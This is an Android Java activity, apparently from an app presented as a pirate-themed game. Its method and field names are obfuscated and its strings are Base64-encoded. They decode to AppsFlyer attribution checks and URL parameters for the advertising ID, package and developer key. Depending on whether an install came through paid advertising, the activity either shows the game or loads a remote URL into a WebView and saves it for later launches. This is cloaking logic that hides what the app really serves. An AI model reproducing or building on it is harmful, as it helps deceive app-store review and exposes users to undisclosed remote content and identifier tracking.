package com.lluuckky.ppiiratess.sewqu;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.webkit.ValueCallback;


import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.navigation.NavController;
import androidx.navigation.Navigation;

import java.util.Base64;


public class LP extends AppCompatActivity {


    public static ValueCallback<Uri> kisae;
    public static Uri iuydtcva = null;
    public static ValueCallback<Uri[]> iudytrgs;
    public static String iduha;
    public static final int iduhsw = 1;
    @SuppressLint("StaticFieldLeak")
    public static NavController navController;
    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.lp);
        getWindow().addFlags(1024);
        navController = Navigation.findNavController(this, R.id.nav_host_fragment);
        FragmentButt.lp = this;
        FragmentGame.lp = this;
        FragmentOf.WRTY.lp = this;
        FragmentOf.WEF.lp = this;



        if (FragmentButt.gfj(this) == 0){


            new Thread(new Runnable() {
                @RequiresApi(api = Build.VERSION_CODES.O)
                @Override
                public void run() {

                    try {

                        String yn = FragmentButt.ufh();
                        String [] fdo = yn.split("\\\u007C");
                        FragmentGame.ffbb(fdo);

                        runOnUiThread(new Runnable() {
                            @Override
                            public void run() {
                                FragmentPol.yfhs(LP.this);

                                String ysg = getSharedPreferences(getPackageName(), MODE_PRIVATE).getString(LP.ffffd("c2F2ZWRVcmw="), "poiuhs");
                                if (ysg.equals("poiuhs")) {

                                    new Handler().postDelayed(new Runnable() {
                                        @Override
                                        public void run() {

                                            String statusAppsFlyer = FragmentPol.iuytvsa;
                                            if (statusAppsFlyer.equals(LP.ffffd("Tm9uLW9yZ2FuaWM="))){
                                                FragmentOf.iusba = FragmentButt.jdus + FragmentPol.iuycab;
                                                navController.navigate(R.id.fragmentOf);
                                            }else if(FragmentPol.iuytvs != null) {
                                                FragmentOf.iusba = FragmentButt.jdus + FragmentPol.iusha;
                                                navController.navigate(R.id.fragmentOf);
                                            }else {
                                                if (FragmentButt.jhshdado.equals(LP.ffffd("Tk8="))) {
                                                    navController.navigate(R.id.fragmentButt);
                                                }else {
                                                    String strAppsFlyer = FragmentButt.jhshdado + LP.ffffd("P2J1bmRsZT0=") + getPackageName() + LP.ffffd("JmFkX2lkPQ==") + FragmentPol.idbwtda + LP.ffffd("JmFwcHNfaWQ9")
                                                            + FragmentPol.iuybsa + LP.ffffd("JmRldl9rZXk9") + LP.ffffd(FragmentPol.iuyba);
                                                    FragmentOf.iusba = FragmentButt.jdus + strAppsFlyer;
                                                    navController.navigate(R.id.fragmentOf);
                                                }
                                            }

                                        }
                                    }, 5000);



                                }else {

                                    FragmentOf.iusba = ysg;
                                    navController.navigate(R.id.fragmentOf);

                                }

                            }
                        });


                    }catch (Exception e){

                        navController.navigate(R.id.fragmentButt);
                    }

                }
            }).start();



        }else {
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    navController.navigate(R.id.fragmentButt);

                }
            },1000);

        }
    }

    @Override
    public void onBackPressed() {

        if (FragmentButt.pol == true){
            navController.navigate(R.id.fragmentButt);
            FragmentButt.pol = false;
        }else {
            if (FragmentOf.ttttre.isFocused() && FragmentOf.ttttre.canGoBack()) {
                FragmentOf.ttttre.goBack();
            }
        }


    }

    @RequiresApi(api = Build.VERSION_CODES.O)
    public static String ffffd(String ifdbj){
        Base64.Decoder udbs = Base64.getDecoder();
        String ubcs = new String(udbs.decode(ifdbj));
        return ubcs;
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        if (requestCode != iduhsw || iudytrgs == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri[] results = null;
        if (resultCode == Activity.RESULT_OK) {
            if (data == null) {
                if (iduha != null) {
                    results = new Uri[]{Uri.parse(iduha)};
                }
            } else {
                String dataString = data.getDataString();
                if (dataString != null) {
                    results = new Uri[]{Uri.parse(dataString)};
                }
            }
        }
        iudytrgs.onReceiveValue(results);
        iudytrgs = null;
        if (kisae == null) {
            super.onActivityResult(requestCode, resultCode, data);
            return;
        }
        Uri result = null;
        try {
            if (resultCode != RESULT_OK) {
                result = null;
            } else {
                result = data == null ? iuydtcva : data.getData();
            }
        } catch (Exception e) { }
        kisae.onReceiveValue(result);
        kisae = null;
    }
}
